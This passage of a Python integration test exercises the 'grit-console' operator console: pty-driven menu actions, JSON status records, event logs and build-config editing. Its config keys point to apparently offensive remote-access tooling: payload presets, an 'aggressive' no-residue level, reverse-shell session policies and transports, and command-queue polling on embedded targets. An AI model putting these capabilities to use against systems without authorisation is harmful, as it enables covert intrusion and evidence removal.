            print(copied.stderr, file=sys.stderr)
            return 1
        copied_text = command_copy_file.read_text(encoding="utf-8")
        if "grit put /etc/config/network" not in copied_text:
            print("generated target command copy file has wrong content", file=sys.stderr)
            return 1
        copied_status = json.loads(run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--json-status",
        ).stdout)
        copied_record = copied_status.get("command_copy") or {}
        copied_state = (copied_status.get("command_copy_state_records_by_id") or {}).get("command-copy") or {}
        if (copied_record.get("path") != str(command_copy_file) or
                copied_record.get("has_command") is not True or
                "grit put /etc/config/network" not in copied_record.get("command", "") or
                copied_state.get("path") != str(command_copy_file) or
                copied_state.get("exists") is not True or
                copied_state.get("readable") is not True or
                copied_state.get("has_command") is not True or
                copied_state.get("empty_or_missing") is not False or
                copied_state.get("has_readable_command") is not True or
                (copied_status.get("target_commands_by_ordinal") or {}).get("1", {}).get("copy_command") != "scripts/grit-console --copy-target-command 1" or
                (copied_status.get("target_commands_by_copy_supported") or {}).get("True", [{}])[0].get("ordinal") != 1 or
                copied_status.get("command_copy_records_by_has_command", {}).get("True", [{}])[0].get("path") != str(command_copy_file) or
                copied_status.get("command_copy_state_records_by_has_readable_command", {}).get("True", [{}])[0].get("id") != "command-copy" or
                copied_status.get("summary", {}).get("command_copy_has_command_count") != 1 or
                copied_status.get("summary", {}).get("command_copy_state_record_count") != 1 or
                copied_status.get("summary", {}).get("command_copy_state_has_readable_command") is not True or
                copied_status.get("summary", {}).get("target_command_copy_supported_count") != copied_status.get("summary", {}).get("target_command_count")):
            print("json status missing last copied command record", file=sys.stderr)
            print(json.dumps(copied_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        copied_events = (copied_status.get("events_by_event") or {}).get("target_command_copied") or []
        if not any(
                "--copy-target-command 1" in ((event.get("details") or {}).get("headless_command") or "") and
                (event.get("details") or {}).get("ordinal") == 1
                for event in copied_events):
            print("generated target command copy event missing headless command", file=sys.stderr)
            print(json.dumps(copied_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1

        copy_tui_master, copy_tui_slave = pty.openpty()
        try:
            copy_tui_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(cfg),
                ],
                cwd=ROOT,
                stdin=copy_tui_slave,
                stdout=copy_tui_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(copy_tui_slave)
            copy_tui_slave = -1
            time.sleep(0.3)
            os.write(copy_tui_master, b"c\n1\nq\n")
            _copy_tui_stdout, copy_tui_stderr = copy_tui_proc.communicate(timeout=8)
            copy_tui_output = b""
            while True:
                try:
                    chunk = os.read(copy_tui_master, 65536)
                except OSError:
                    break
                if not chunk:
                    break
                copy_tui_output += chunk
        finally:
            if copy_tui_slave != -1:
                os.close(copy_tui_slave)
            try:
                os.close(copy_tui_master)
            except OSError:
                pass
        copy_tui_text = copy_tui_output.decode("utf-8", errors="replace")
        if (copy_tui_proc.returncode != 0 or
                "Traceback" in (copy_tui_stderr or "") or
                "copied command to " not in copy_tui_text or
                "headless_command:" in copy_tui_text):
            print("line console generated-command copy exposed noisy headless command or missed expected summary", file=sys.stderr)
            print(copy_tui_text, file=sys.stderr)
            print(copy_tui_stderr or "", file=sys.stderr)
            return 1

        actions_tui_master, actions_tui_slave = pty.openpty()
        try:
            actions_tui_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(cfg),
                ],
                cwd=ROOT,
                stdin=actions_tui_slave,
                stdout=actions_tui_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(actions_tui_slave)
            actions_tui_slave = -1
            time.sleep(0.3)
            os.write(actions_tui_master, b"11\nsystemd-user-status\n\nq\n")
            _actions_tui_stdout, actions_tui_stderr = actions_tui_proc.communicate(timeout=8)
            actions_tui_output = b""
            while True:
                try:
                    chunk = os.read(actions_tui_master, 65536)
                except OSError:
                    break
                if not chunk:
                    break
                actions_tui_output += chunk
        finally:
            if actions_tui_slave != -1:
                os.close(actions_tui_slave)
            try:
                os.close(actions_tui_master)
            except OSError:
                pass
        actions_tui_text = actions_tui_output.decode("utf-8", errors="replace")
        if (actions_tui_proc.returncode != 0 or
                "Traceback" in (actions_tui_stderr or "") or
                "Workbench action summary:" not in actions_tui_text or
                "headless_command:" in actions_tui_text or
                "headless_command=" in actions_tui_text or
                "operator-daemon-status" not in actions_tui_text or
                "operator action id/number to run" not in actions_tui_text or
                "foreground_runnable=yes" not in actions_tui_text or
                "service 1:" not in actions_tui_text or
                "file-service:start-service" not in actions_tui_text or
                "enter_action=start-service" not in actions_tui_text or
                "workbench action: systemd-user-status" not in actions_tui_text or
                "systemctl --user status grit-operator.service" not in actions_tui_text or
                "workbench_action_returncode=0" not in actions_tui_text):
            print("line console workflow-action view/run exposed noisy headless commands or missed expected summaries", file=sys.stderr)
            print(actions_tui_text, file=sys.stderr)
            print(actions_tui_stderr or "", file=sys.stderr)
            return 1
        actions_tui_events = [
            json.loads(line)
            for line in (queue_operator_dir / "events.jsonl").read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]
        if not any(
                event.get("event") == "workbench_actions_viewed" and
                "--status" in ((event.get("details") or {}).get("headless_command") or "") and
                (event.get("details") or {}).get("action_count", 0) > 0 and
                (event.get("details") or {}).get("service_workflow_action_count", 0) > 0
                for event in actions_tui_events):
            print("line console workflow-action view did not record headless command event", file=sys.stderr)
            print(json.dumps(actions_tui_events[-8:], indent=2, sort_keys=True), file=sys.stderr)
            return 1
        if not any(
                event.get("event") == "workbench_action_run_completed" and
                (event.get("details") or {}).get("action_id") == "systemd-user-status" and
                (event.get("details") or {}).get("dry_run") is True and
                "--run-workbench-action systemd-user-status --workbench-action-dry-run" in ((event.get("details") or {}).get("headless_command") or "")
                for event in actions_tui_events):
            print("line console workflow-action run did not record dry-run event", file=sys.stderr)
            print(json.dumps(actions_tui_events[-12:], indent=2, sort_keys=True), file=sys.stderr)
            return 1

        refresh_tui_master, refresh_tui_slave = pty.openpty()
        try:
            refresh_tui_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(cfg),
                ],
                cwd=ROOT,
                stdin=refresh_tui_slave,
                stdout=refresh_tui_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(refresh_tui_slave)
            refresh_tui_slave = -1
            time.sleep(0.3)
            os.write(refresh_tui_master, b"r\nq\n")
            refresh_tui_output = b""
            refresh_deadline = time.time() + 10
            while refresh_tui_proc.poll() is None and time.time() < refresh_deadline:
                ready, _, _ = select.select([refresh_tui_master], [], [], 0.1)
                if ready:
                    try:
                        chunk = os.read(refresh_tui_master, 65536)
                    except OSError:
                        break
                    if not chunk:
                        break
                    refresh_tui_output += chunk
            if refresh_tui_proc.poll() is None:
                try:
                    os.write(refresh_tui_master, b"q\n")
                except OSError:
                    pass
                quit_deadline = time.time() + 3
                while refresh_tui_proc.poll() is None and time.time() < quit_deadline:
                    ready, _, _ = select.select([refresh_tui_master], [], [], 0.1)
                    if ready:
                        try:
                            chunk = os.read(refresh_tui_master, 65536)
                        except OSError:
                            break
                        if not chunk:
                            break
                        refresh_tui_output += chunk
            if refresh_tui_proc.poll() is None:
                refresh_tui_proc.terminate()
                try:
                    refresh_tui_proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    refresh_tui_proc.kill()
                    refresh_tui_proc.wait(timeout=2)
            refresh_tui_stderr = refresh_tui_proc.stderr.read()
            while True:
                try:
                    chunk = os.read(refresh_tui_master, 65536)
                except OSError:
                    break
                if not chunk:
                    break
                refresh_tui_output += chunk
        finally:
            if refresh_tui_slave != -1:
                os.close(refresh_tui_slave)
            try:
                os.close(refresh_tui_master)
            except OSError:
                pass
        refresh_tui_text = refresh_tui_output.decode("utf-8", errors="replace")
        if (refresh_tui_proc.returncode != 0 or
                "Traceback" in (refresh_tui_stderr or "") or
                "refreshed workbench at " not in refresh_tui_text or
                "headless_command:" in refresh_tui_text):
            print("line console refresh exposed noisy headless command or missed expected summary", file=sys.stderr)
            print(refresh_tui_text, file=sys.stderr)
            print(refresh_tui_stderr or "", file=sys.stderr)
            return 1
        refresh_tui_events = [
            json.loads(line)
            for line in (queue_operator_dir / "events.jsonl").read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]
        if not any(
                event.get("event") == "workbench_refreshed" and
                "--status" in ((event.get("details") or {}).get("headless_command") or "")
                for event in refresh_tui_events):
            print("line console refresh did not record headless command event", file=sys.stderr)
            print(json.dumps(refresh_tui_events[-8:], indent=2, sort_keys=True), file=sys.stderr)
            return 1

        missing_view_path = str(Path(tmp) / "missing-view-path.txt")
        view_path = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--view-path", missing_view_path,
        )
        if view_path.returncode != 0 or f"no viewable local file: {missing_view_path}" not in view_path.stdout:
            print("headless view-path did not report missing local file", file=sys.stderr)
            print(view_path.stdout, file=sys.stderr)
            print(view_path.stderr, file=sys.stderr)
            return 1
        view_tui_master, view_tui_slave = pty.openpty()
        try:
            view_tui_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(cfg),
                ],
                cwd=ROOT,
                stdin=view_tui_slave,
                stdout=view_tui_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(view_tui_slave)
            view_tui_slave = -1
            time.sleep(0.3)
            os.write(view_tui_master, f"9\n{missing_view_path}\nq\n".encode("utf-8"))
            _view_tui_stdout, view_tui_stderr = view_tui_proc.communicate(timeout=8)
            view_tui_output = b""
            while True:
                try:
                    chunk = os.read(view_tui_master, 65536)
                except OSError:
                    break
                if not chunk:
                    break
                view_tui_output += chunk
        finally:
            if view_tui_slave != -1:
                os.close(view_tui_slave)
            try:
                os.close(view_tui_master)
            except OSError:
                pass
        view_tui_text = view_tui_output.decode("utf-8", errors="replace")
        if (view_tui_proc.returncode != 0 or
                "Traceback" in (view_tui_stderr or "") or
                "headless_command:" in view_tui_text or
                f"no viewable local file: {missing_view_path}" not in view_tui_text):
            print("line console path view exposed noisy headless command or missed expected summary", file=sys.stderr)
            print(view_tui_text, file=sys.stderr)
            print(view_tui_stderr or "", file=sys.stderr)
            return 1
        view_tui_events = [
            json.loads(line)
            for line in (queue_operator_dir / "events.jsonl").read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]
        if (not any(
                event.get("event") == "workbench_path_viewed" and
                event.get("details", {}).get("via") == "server-view-path" and
                "--view-path " in event.get("details", {}).get("headless_command", "")
                for event in view_tui_events) or
                not any(
                    event.get("event") == "workbench_path_viewed" and
                    event.get("details", {}).get("via", "") == "" and
                    "--view-path " in event.get("details", {}).get("headless_command", "")
                    for event in view_tui_events)):
            print("path view events did not record headless view-path commands", file=sys.stderr)
            print(json.dumps(view_tui_events[-12:], indent=2, sort_keys=True), file=sys.stderr)
            return 1

        stop_service = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--stop-service", "file-service",
        )
        if stop_service.returncode != 0 or "file-service: no recorded pid" not in stop_service.stdout:
            print("headless stop-service did not handle a single service", file=sys.stderr)
            print(stop_service.stdout, file=sys.stderr)
            print(stop_service.stderr, file=sys.stderr)
            return 1
        stop_tui_master, stop_tui_slave = pty.openpty()
        try:
            stop_tui_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(cfg),
                ],
                cwd=ROOT,
                stdin=stop_tui_slave,
                stdout=stop_tui_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(stop_tui_slave)
            stop_tui_slave = -1
            time.sleep(0.3)
            os.write(stop_tui_master, b"5\nfile-service\nq\n")
            _stop_tui_stdout, stop_tui_stderr = stop_tui_proc.communicate(timeout=8)
            stop_tui_output = b""
            while True:
                try:
                    chunk = os.read(stop_tui_master, 65536)
                except OSError:
                    break
                if not chunk:
                    break
                stop_tui_output += chunk
        finally:
            if stop_tui_slave != -1:
                os.close(stop_tui_slave)
            try:
                os.close(stop_tui_master)
            except OSError:
                pass
        stop_tui_text = stop_tui_output.decode("utf-8", errors="replace")
        if (stop_tui_proc.returncode != 0 or
                "Traceback" in (stop_tui_stderr or "") or
                "file-service: no recorded pid" not in stop_tui_text):
            print("line console service stop did not report stop outcome", file=sys.stderr)
            print(stop_tui_text, file=sys.stderr)
            print(stop_tui_stderr or "", file=sys.stderr)
            return 1
        stop_events = [
            json.loads(line)
            for line in (queue_operator_dir / "events.jsonl").read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]
        if (not any(
                    event.get("service") == "file-service" and
                    event.get("event") == "service_stop" and
                    event.get("details", {}).get("via") == "server-stop-service" and
                    "--stop-service file-service" in event.get("details", {}).get("headless_command", "")
                    for event in stop_events) or
                not any(
                    event.get("service") == "file-service" and
                    event.get("event") == "service_stop" and
                    event.get("details", {}).get("via") == "workbench-stop" and
                    "--stop-service file-service" in event.get("details", {}).get("headless_command", "")
                    for event in stop_events)):
            print("service stop events did not record headless stop-service commands", file=sys.stderr)
            print(json.dumps(stop_events[-12:], indent=2, sort_keys=True), file=sys.stderr)
            return 1

        guided_build_config = Path(tmp) / "guided-grit.conf"
        guided_build_config.write_text(
            'GRIT_TARGET_PRESET="native"\n'
            'GRIT_PAYLOAD_PRESET="survey-core"\n'
            'GRIT_STATIC_POLICY="static-preferred"\n'
            'GRIT_NORESIDUE_LEVEL="best-effort"\n'
            'GRIT_RSHELL_SESSION_POLICY="single"\n'
            'GRIT_COMMAND_QUEUE_ENABLE="no"\n'
            'GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC="5"\n',
            encoding="utf-8",
        )
        listed_build_config = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--build-config", str(guided_build_config),
            "--list-build-config",
        )
        if (listed_build_config.returncode != 0 or
                "GRIT_TARGET_PRESET" not in listed_build_config.stdout or
                "GRIT_NORESIDUE_LEVEL" not in listed_build_config.stdout or
                "GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC" not in listed_build_config.stdout or
                "safety: boundary=command-queue control_like=yes explicit_choice=yes" not in listed_build_config.stdout or
                "--set-build-config" not in listed_build_config.stdout):
            print("guided build config listing missing expected fields", file=sys.stderr)
            print(listed_build_config.stdout, file=sys.stderr)
            print(listed_build_config.stderr, file=sys.stderr)
            return 1
        set_build_config = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--build-config", str(guided_build_config),
            "--set-build-config", "GRIT_NORESIDUE_LEVEL=aggressive",
            "--set-build-config", "GRIT_RSHELL_SESSION_POLICY=reconnect",
            "--set-build-config", "GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC=10",
            "--set-build-config", "GRIT_COMMAND_QUEUE_POLL_BACKOFF=linear",
        )
        if (set_build_config.returncode != 0 or
                'GRIT_NORESIDUE_LEVEL="aggressive"' not in set_build_config.stdout or
                'GRIT_RSHELL_SESSION_POLICY="reconnect"' not in set_build_config.stdout or
                'GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC="10"' not in set_build_config.stdout or
                'GRIT_COMMAND_QUEUE_POLL_BACKOFF="linear"' not in set_build_config.stdout):
            print("guided build config update failed", file=sys.stderr)
            print(set_build_config.stdout, file=sys.stderr)
            print(set_build_config.stderr, file=sys.stderr)
            return 1
        guided_text = guided_build_config.read_text(encoding="utf-8")
        if ('GRIT_NORESIDUE_LEVEL="aggressive"' not in guided_text or
                'GRIT_RSHELL_SESSION_POLICY="reconnect"' not in guided_text or
                'GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC="10"' not in guided_text or
                'GRIT_COMMAND_QUEUE_POLL_BACKOFF="linear"' not in guided_text):
            print("guided build config file was not updated", file=sys.stderr)
            print(guided_text, file=sys.stderr)
            return 1
        guided_status = json.loads(run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--build-config", str(guided_build_config),
            "--json-status",
        ).stdout)
        guided_fields = guided_status.get("workbench_config_fields") or []
        guided_by_key = guided_status.get("workbench_config_fields_by_key") or {}
        guided_by_category = guided_status.get("workbench_config_fields_by_category") or {}
        guided_fixed = guided_status.get("workbench_config_fields_by_fixed_options") or {}
        guided_writes_config = guided_status.get("workbench_config_fields_by_writes_config") or {}
        guided_target_execution = guided_status.get("workbench_config_fields_by_target_execution") or {}
        guided_source_format = guided_status.get("workbench_config_fields_by_source_format") or {}
        guided_has_set_command = guided_status.get("workbench_config_fields_by_has_set_command") or {}
        guided_set_command_kind = guided_status.get("workbench_config_fields_by_set_command_kind") or {}
        guided_safety = guided_status.get("workbench_config_fields_by_safety_boundary") or {}
        guided_control_like = guided_status.get("workbench_config_fields_by_control_like") or {}
        guided_command_queue = guided_status.get("workbench_config_fields_by_command_queue_related") or {}
        guided_reverse_access = guided_status.get("workbench_config_fields_by_reverse_access_related") or {}
        guided_explicit_choice = guided_status.get("workbench_config_fields_by_requires_explicit_operator_choice") or {}
        if (len(guided_fields) < 12 or
                guided_status.get("summary", {}).get("workbench_config_field_count") != len(guided_fields) or
                guided_by_key.get("GRIT_NORESIDUE_LEVEL", {}).get("value") != "aggressive" or
                guided_by_key.get("GRIT_RSHELL_SESSION_POLICY", {}).get("value") != "reconnect" or
                guided_by_key.get("GRIT_RSHELL_SESSION_POLICY", {}).get("safety_boundary") != "reverse-access" or
                guided_by_key.get("GRIT_COMMAND_QUEUE_ENABLE", {}).get("control_like") is not True or
                guided_by_key.get("GRIT_COMMAND_QUEUE_ENABLE", {}).get("requires_explicit_operator_choice") is not True or
                guided_by_key.get("GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC", {}).get("value") != "10" or
                guided_by_key.get("GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC", {}).get("fixed_options") is not False or
                guided_by_key.get("GRIT_COMMAND_QUEUE_POLL_BACKOFF", {}).get("options") != ["none", "linear", "exponential"] or
                guided_by_key.get("GRIT_RSHELL_TRANSPORT", {}).get("examples") != ["ssh", "socat", "builtin", "none"] or
                guided_by_key.get("GRIT_RSHELL_TRANSPORT", {}).get("options") != ["ssh", "socat", "builtin", "none"] or
                guided_by_key.get("GRIT_TARGET_PRESET", {}).get("examples") != ["mipsel-linux-4.x-musl", "native"] or
                guided_by_key.get("GRIT_RSHELL_SESSION_POLICY", {}).get("fixed_options") is not True or
                guided_by_key.get("GRIT_RSHELL_SESSION_POLICY", {}).get("option_count") != 3 or
                guided_status.get("summary", {}).get("workbench_config_field_fixed_option_count", 0) < 17 or
                guided_status.get("summary", {}).get("workbench_config_field_has_set_command_count") != len(guided_fields) or
                guided_status.get("summary", {}).get("workbench_config_field_set_command_kind_counts", {}).get("server-build-config-set") != len(guided_fields) or
                guided_status.get("summary", {}).get("workbench_config_field_control_like_count", 0) < 16 or
                guided_status.get("summary", {}).get("workbench_config_field_safety_boundary_counts", {}).get("command-queue", 0) < 13 or
                not guided_fixed.get("True") or
                len(guided_writes_config.get("True", [])) != len(guided_fields) or
                guided_target_execution.get("True", []) != [] or
                len(guided_target_execution.get("False", [])) != len(guided_fields) or
                len(guided_source_format.get("shell-assignment", [])) != len(guided_fields) or
                len(guided_has_set_command.get("True", [])) != len(guided_fields) or
                len(guided_set_command_kind.get("server-build-config-set", [])) != len(guided_fields) or
                "--set-build-config GRIT_NORESIDUE_LEVEL=VALUE" not in guided_by_key.get("GRIT_NORESIDUE_LEVEL", {}).get("set_command", "") or
                not guided_safety.get("reverse-access") or
                not guided_control_like.get("True") or
                not guided_command_queue.get("True") or
                not guided_reverse_access.get("True") or
                not guided_explicit_choice.get("True") or
                not guided_by_category.get("target") or
                not guided_by_category.get("command-queue") or
                guided_status.get("summary", {}).get("event_detail_key_counts", {}).get("GRIT_NORESIDUE_LEVEL", 0) != 1 or
                guided_status.get("summary", {}).get("event_detail_config_path_counts", {}).get(str(guided_build_config), 0) < 4 or
                guided_status.get("summary", {}).get("event_type_detail_key_counts", {}).get("workbench_config_updated:GRIT_NORESIDUE_LEVEL", 0) != 1 or
                guided_status.get("summary", {}).get("event_type_detail_config_path_counts", {}).get(f"workbench_config_updated:{guided_build_config}", 0) != 4 or
                guided_status.get("summary", {}).get("event_service_detail_config_path_counts", {}).get(f"workbench:{guided_build_config}", 0) < 4 or
                (guided_status.get("event_log_stats") or {}).get("by_detail_key", {}).get("GRIT_RSHELL_SESSION_POLICY", 0) != 1 or
                (guided_status.get("event_log_stats") or {}).get("by_detail_config_path", {}).get(str(guided_build_config), 0) < 4 or
                (guided_status.get("events_by_detail_key") or {}).get("GRIT_COMMAND_QUEUE_POLL_BACKOFF", [{}])[-1].get("details", {}).get("new_value") != "linear" or
                (guided_status.get("events_by_detail_config_path") or {}).get(str(guided_build_config), [{}])[-1].get("details", {}).get("key") != "GRIT_COMMAND_QUEUE_POLL_BACKOFF" or
                (guided_status.get("events_by_event_detail_key") or {}).get("workbench_config_updated:GRIT_NORESIDUE_LEVEL", [{}])[-1].get("event") != "workbench_config_updated" or
                (guided_status.get("events_by_service_detail_key") or {}).get("workbench:GRIT_RSHELL_SESSION_POLICY", [{}])[-1].get("details", {}).get("new_value") != "reconnect" or
                (guided_status.get("events_by_event_detail_config_path") or {}).get(f"workbench_config_updated:{guided_build_config}", [{}])[-1].get("details", {}).get("key") != "GRIT_COMMAND_QUEUE_POLL_BACKOFF" or
                (guided_status.get("events_by_service_detail_config_path") or {}).get(f"workbench:{guided_build_config}", [{}])[-1].get("details", {}).get("key") != "GRIT_COMMAND_QUEUE_POLL_BACKOFF" or
                guided_status.get("api_collections", {}).get("workbench_config_fields", {}).get("primary_key") != "key" or
                "workbench_config_fields_by_fixed_options" not in guided_status.get("api_collections", {}).get("workbench_config_fields", {}).get("indexes", []) or
                "workbench_config_fields_by_target_execution" not in guided_status.get("api_collections", {}).get("workbench_config_fields", {}).get("indexes", []) or
                "workbench_config_fields_by_has_set_command" not in guided_status.get("api_collections", {}).get("workbench_config_fields", {}).get("indexes", []) or
                "workbench_config_fields_by_set_command_kind" not in guided_status.get("api_collections", {}).get("workbench_config_fields", {}).get("indexes", []) or
                "workbench_config_fields_by_safety_boundary" not in guided_status.get("api_collections", {}).get("workbench_config_fields", {}).get("indexes", []) or
                "events_by_detail_key" not in (((guided_status.get("api_collections") or {}).get("events") or {}).get("indexes") or []) or
                "events_by_event_detail_key" not in (((guided_status.get("api_collections") or {}).get("events") or {}).get("indexes") or []) or
                "events_by_service_detail_config_path" not in (((guided_status.get("api_collections") or {}).get("events") or {}).get("indexes") or [])):
            print("server json status missing guided build config field records", file=sys.stderr)
            print(json.dumps(guided_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        bad_build_config = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--build-config", str(guided_build_config),
            "--set-build-config", "GRIT_RSHELL_SESSION_POLICY=resume",
        )
        if bad_build_config.returncode == 0 or "unsupported value for GRIT_RSHELL_SESSION_POLICY" not in (bad_build_config.stdout + bad_build_config.stderr):
            print("guided build config accepted invalid fixed-option value", file=sys.stderr)
            print(bad_build_config.stdout, file=sys.stderr)
            print(bad_build_config.stderr, file=sys.stderr)
            return 1
        guided_events = [
            json.loads(line)
            for line in (queue_operator_dir / "events.jsonl").read_text(encoding="utf-8").splitlines()
        ]
        if not any(
                event.get("event") == "workbench_config_updated" and
                event.get("details", {}).get("key") == "GRIT_NORESIDUE_LEVEL" and
                "--set-build-config GRIT_NORESIDUE_LEVEL=aggressive" in event.get("details", {}).get("headless_command", "")
                for event in guided_events):
            print("guided build config update event missing", file=sys.stderr)
            return 1
        build_config_tui_master, build_config_tui_slave = pty.openpty()
        try:
            build_config_tui_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(cfg),
                    "--build-config", str(guided_build_config),
                ],
                cwd=ROOT,
                stdin=build_config_tui_slave,
                stdout=build_config_tui_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(build_config_tui_slave)
            build_config_tui_slave = -1
            time.sleep(0.3)
            os.write(build_config_tui_master, b"14\nGRIT_COMMAND_QUEUE_ENABLE\nyes\nq\n")
            _build_config_tui_stdout, build_config_tui_stderr = build_config_tui_proc.communicate(timeout=8)
            build_config_tui_output = b""
            while True:
                try:
                    chunk = os.read(build_config_tui_master, 65536)
                except OSError:
                    break
                if not chunk:
                    break
                build_config_tui_output += chunk
        finally:
            if build_config_tui_slave != -1:
                os.close(build_config_tui_slave)
            try:
                os.close(build_config_tui_master)
            except OSError:
                pass
        build_config_tui_text = build_config_tui_output.decode("utf-8", errors="replace")
        if (build_config_tui_proc.returncode != 0 or
                "Traceback" in (build_config_tui_stderr or "") or
                'set GRIT_COMMAND_QUEUE_ENABLE="yes"' not in build_config_tui_text or
                "command-queue:" not in build_config_tui_text or
                "underlying command:" in build_config_tui_text or
                "headless_command:" in build_config_tui_text):
            print("line console build config edit exposed noisy headless command or missed expected summary", file=sys.stderr)
            print(build_config_tui_text, file=sys.stderr)
            print(build_config_tui_stderr or "", file=sys.stderr)
            return 1
        build_config_tui_status = json.loads(run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--build-config", str(guided_build_config),
            "--json-status",
        ).stdout)
        tui_config_event = (build_config_tui_status.get("events_by_event_detail_key") or {}).get("workbench_config_updated:GRIT_COMMAND_QUEUE_ENABLE", [{}])[-1]
        if (build_config_tui_status.get("workbench_config_fields_by_key", {}).get("GRIT_COMMAND_QUEUE_ENABLE", {}).get("value") != "yes" or
                tui_config_event.get("details", {}).get("new_value") != "yes" or
                "--set-build-config GRIT_COMMAND_QUEUE_ENABLE=yes" not in tui_config_event.get("details", {}).get("headless_command", "")):
            print("line console build config edit was not reflected in status/event records", file=sys.stderr)
            print(json.dumps(build_config_tui_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1

        workbench_job_dir = Path(tmp) / "operator-session-workbench-job"
        workbench_job_cfg = Path(tmp) / "server-config-workbench-job.json"
        workbench_job_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "operator_session_dir": str(workbench_job_dir),
            "session_root": str(Path(tmp) / "sessions-workbench-job"),
        }), encoding="utf-8")
        started_job = run(
            "scripts/grit-console",
            "--config", str(workbench_job_cfg),
            "--start-workbench-job", "package-artifact",
            "--job-command", "printf 'job ready\\n'; sleep 30",
        )
        if (started_job.returncode != 0 or
                "started workbench job" not in started_job.stdout or
                "command=printf 'job ready\\n'; sleep 30" not in started_job.stdout or
                "headless_command=" in started_job.stdout):
            print("workbench background job did not start", file=sys.stderr)
            print(started_job.stdout, file=sys.stderr)
            print(started_job.stderr, file=sys.stderr)
            return 1
        job_id = ""
        for token in started_job.stdout.replace(":", " ").split():
            if token.startswith("job-"):
                job_id = token
                break
        if not job_id:
            print("workbench background job id missing", file=sys.stderr)
            print(started_job.stdout, file=sys.stderr)
            return 1
        job_status = None
        for _ in range(20):
            job_status_doc = run(
                "scripts/grit-console",
                "--config", str(workbench_job_cfg),
                "--json-status",
            )
            job_status = json.loads(job_status_doc.stdout)
            job = (job_status.get("workbench_jobs_by_id") or {}).get(job_id) or {}
            if job.get("cancel_supported") is True:
                break
            time.sleep(0.1)
        job = (job_status.get("workbench_jobs_by_id") or {}).get(job_id) or {}
        if (job.get("action_id") != "package-artifact" or
                job.get("effective_state") != "running" or
                job.get("cancel_supported") is not True or
                job.get("started_at_known") is not True or
                job.get("finished_at_known") is not False or
                job.get("duration_known") is not False or
                job.get("elapsed_known") is not True or
                "environ:job-id" not in (job.get("ownership_evidence") or []) or
                "environ:action-id" not in (job.get("ownership_evidence") or []) or
                "job ready" not in "\n".join(job.get("last_output_tail") or []) or
                job_status.get("summary", {}).get("workbench_job_running_count") != 1):
            print("workbench background job status missing live managed job", file=sys.stderr)
            print(json.dumps(job_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        job_cancel_master, job_cancel_slave = pty.openpty()
        try:
            job_cancel_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(workbench_job_cfg),
                ],
                cwd=ROOT,
                stdin=job_cancel_slave,
                stdout=job_cancel_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(job_cancel_slave)
            job_cancel_slave = -1
            time.sleep(0.3)
            os.write(job_cancel_master, f"13\n{job_id}\nq\n".encode("utf-8"))
            _job_cancel_stdout, job_cancel_stderr = job_cancel_proc.communicate(timeout=8)
            job_cancel_output = b""
            while True:
                try:
                    chunk = os.read(job_cancel_master, 65536)
                except OSError:
                    break
                if not chunk:
                    break
                job_cancel_output += chunk
        finally:
            if job_cancel_slave != -1:
                os.close(job_cancel_slave)
            try:
                os.close(job_cancel_master)
            except OSError:
                pass
        job_cancel_text = job_cancel_output.decode("utf-8", errors="replace")
        if (job_cancel_proc.returncode != 0 or
                "Traceback" in (job_cancel_stderr or "") or
                f"cancel requested for {job_id}" not in job_cancel_text or
                "headless_command:" in job_cancel_text):
            print("line console workbench background job cancel exposed noisy headless command or missed expected summary", file=sys.stderr)
            print(job_cancel_text, file=sys.stderr)
            print(job_cancel_stderr or "", file=sys.stderr)
            return 1
        for _ in range(20):
            cancelled_status_doc = run(
                "scripts/grit-console",
                "--config", str(workbench_job_cfg),
                "--json-status",
            )
            cancelled_status = json.loads(cancelled_status_doc.stdout)
            cancelled = (cancelled_status.get("workbench_jobs_by_id") or {}).get(job_id) or {}
            if cancelled.get("effective_state") != "running":
                break
            time.sleep(0.1)
        if (cancelled.get("state") != "cancelling" or
                cancelled.get("cancel_supported") is not False or
                cancelled_status.get("summary", {}).get("workbench_job_cancel_supported_count") != 0):
            print("workbench background job cancellation status missing", file=sys.stderr)
            print(json.dumps(cancelled_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        job_events = [
            json.loads(line)
            for line in (workbench_job_dir / "events.jsonl").read_text(encoding="utf-8").splitlines()
        ]
